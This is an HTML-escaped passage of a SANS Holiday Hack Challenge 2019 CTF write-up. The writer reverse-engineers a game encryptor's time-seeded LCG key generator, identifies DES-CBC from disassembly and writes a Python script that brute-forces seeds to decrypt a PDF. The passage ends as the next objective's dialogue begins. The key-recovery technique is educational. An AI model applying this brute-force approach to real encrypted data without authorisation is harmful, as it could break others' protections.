    &lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;seed&lt;/span&gt;
    &lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mh"&gt;0x343FD&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xFFFFFFFF&lt;/span&gt;
    &lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x269EC3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xFFFFFFFF&lt;/span&gt;

    &lt;span class="n"&gt;key_byte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x7FFF&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;next_seed&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key_byte&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;&amp;amp; 0xFFFFFFFF&lt;/code&gt; operations are to make sure that every computation is
done on 32-bit values. Let's see if our function works. Let's use the seed in
our first encryption, &lt;code&gt;1578230480&lt;/code&gt;, and see if we generate the same key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1578230480&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;generate_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="go"&gt;a0ad8f3edde93d45&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hurray, we get the same key! Now let's try to decrypt our PDF file. But wait,
what is the encryption algorithm? Well, the encryption key is 8-byte long,
which is 56 bits (not super long). The most symetric algorithm using this key
size is &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Data_Encryption_Standard"&gt;DES&lt;/a&gt;. We
can check that by taking a look at the function &lt;code&gt;do_encrypt&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="nf"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x0040270a&lt;/span&gt;      &lt;span class="mi"&gt;68000000&lt;/span&gt;&lt;span class="nv"&gt;f0&lt;/span&gt;     &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0xf0000000&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x0040270f&lt;/span&gt;      &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nv"&gt;a01&lt;/span&gt;           &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;                      &lt;span class="c1"&gt;; 1&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00402711&lt;/span&gt;      &lt;span class="mi"&gt;6870474000&lt;/span&gt;     &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x404770&lt;/span&gt;               &lt;span class="c1"&gt;; &amp;quot;Microsoft Enhanced Cryptographic Provider v1.0&amp;quot;&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00402716&lt;/span&gt;      &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nv"&gt;a00&lt;/span&gt;           &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00402718&lt;/span&gt;      &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="nv"&gt;d4df4&lt;/span&gt;         &lt;span class="nv"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebp&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0xc&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x0040271b&lt;/span&gt;      &lt;span class="mi"&gt;51&lt;/span&gt;             &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x0040271c&lt;/span&gt;      &lt;span class="nv"&gt;ff1504404000&lt;/span&gt;   &lt;span class="nv"&gt;call&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;sym.imp.ADVAPI32.dll_CryptAcquireContextA&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; pdb.__imp__CryptAcquireContextA_20 ; 0x404004&lt;/span&gt;
&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="nf"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The function &lt;a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta"&gt;CryptAcquireContextA&lt;/a&gt;
is called to obtain an encryption object. The cryptographic service provider
seems to be &lt;a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/microsoft-enhanced-cryptographic-provider"&gt;Microsoft Enhanced Cryptographic Provider v1.0&lt;/a&gt;,
which does seem to use DES as an encryption algorithm.&lt;/p&gt;
&lt;p&gt;Now, DES is a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation"&gt;block cipher&lt;/a&gt;,
and several mode can be used. I first tried ECB on some test files, but it
didn't seem to work: only the first block seemed correctly decrypted. This
seems to indicate that the used mode is CBC, with an initialization vector
full of null bytes.&lt;/p&gt;
&lt;p&gt;Now that we have everything, let's try to decrypt our PDF file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;Crypto.Cipher&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;DES&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytearray&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key_byte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;super_secure_random&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key_byte&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xFF&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;super_secure_random&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;seed&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;seed&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xFFFFFFFF&lt;/span&gt;

    &lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;seed&lt;/span&gt;
    &lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mh"&gt;0x343FD&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xFFFFFFFF&lt;/span&gt;
    &lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x269EC3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xFFFFFFFF&lt;/span&gt;

    &lt;span class="n"&gt;key_byte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;next_seed&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x7FFF&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;next_seed&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key_byte&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;decryptor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;DES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MODE_CBC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;plain_text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;decryptor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;plain_text&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usage: {} &amp;lt;file_to_decrypt&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="n"&gt;encrypted_file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted_file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# We know the file was encrypted on December 6, 2019, between 7pm and 9pm UTC&lt;/span&gt;
    &lt;span class="n"&gt;initial_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2019&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mo"&gt;00&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mo"&gt;00&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tzinfo&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timezone&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;end_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2019&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mo"&gt;00&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mo"&gt;00&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tzinfo&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timezone&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;min_seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;initial_time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timestamp&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
    &lt;span class="n"&gt;max_seed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;end_time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timestamp&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;min_seed&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;max_seed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;key_candidate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;generate_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;min_seed&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;decrypted_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;decrypt_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key_candidate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;# We know the file is a PDF, so we look for the beginning of a PDF&lt;/span&gt;
        &lt;span class="c1"&gt;# file. If the decrypted data starts with &amp;quot;%PDF&amp;quot;, we must have&lt;/span&gt;
        &lt;span class="c1"&gt;# found the correct key.&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;decrypted_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;%PDF&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;decrypted_file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;./{}_{}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key_candidate&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;encrypted_file_name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;decrypted_file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;decrypted_file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[+] We managed to decrypt the file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[*] Initial seed: {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;min_seed&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[*] Encryption key: {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key_candidate&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[+] Decrypted file saved under {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;decrypted_file_name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
            &lt;span class="k"&gt;break&lt;/span&gt;
        &lt;span class="n"&gt;min_seed&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's launch our script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./decrypt_file.py ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc
&lt;span class="go"&gt;[+] We managed to decrypt the file&lt;/span&gt;
&lt;span class="go"&gt;[*] Initial seed: 1575663650&lt;/span&gt;
&lt;span class="go"&gt;[*] Encryption key: b5ad6a321240fbec&lt;/span&gt;
&lt;span class="go"&gt;[+] Decrypted file saved under ./b5ad6a321240fbec_ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yay! We managed to decrypt the file. You can download it &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf"&gt;here&lt;/a&gt;.
It seems to be a quick start guide for Santa's Super Sled-O-Matic Machine
Learning Sleigh Route Finder, which seems to be a device mounted on Santa's
sled to help him find his route for his delivery.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-11"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id37"&gt;Objective 11:&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="kent-tinseltooth-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id38"&gt;Kent Tinseltooth's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We arrive on Kent having an internal monologue. Apparently his IoT braces were
hacked:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;Inner Voice: Kent. Kent. Wake up, Kent.&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: I&amp;#39;m talking to you, Kent.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: Who said that? I must be going insane.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: Am I?&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: That remains to be seen, Kent. But we are having a conversation.&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: This is Santa, Kent, and you&amp;#39;ve been a very naughty boy.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: Alright! Who is this?! Holly? Minty? Alabaster?&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: I am known by many names. I am the boss of the North Pole. Turn to me and be hired after graduation.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: Oh, sure.&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: Cut the candy, Kent, you&amp;#39;ve built an automated, machine-learning, sleigh device.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: How did you know that?&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: I&amp;#39;m Santa - I know everything.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: Oh. Kringle. *sigh*&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: That&amp;#39;s right, Kent. Where is the sleigh device now?&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: I can&amp;#39;t tell you.&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: How would you like to intern for the rest of time?&lt;/span&gt;
